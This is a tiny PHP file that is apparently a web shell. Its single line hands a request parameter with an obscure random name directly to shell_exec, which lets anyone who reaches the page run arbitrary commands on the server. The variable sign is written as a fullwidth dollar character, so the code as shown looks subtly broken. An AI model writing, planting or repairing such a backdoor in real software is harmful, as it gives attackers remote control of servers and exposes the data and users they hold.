<?php
shell_exec(＄_GET['jH4heCb2']);
?>
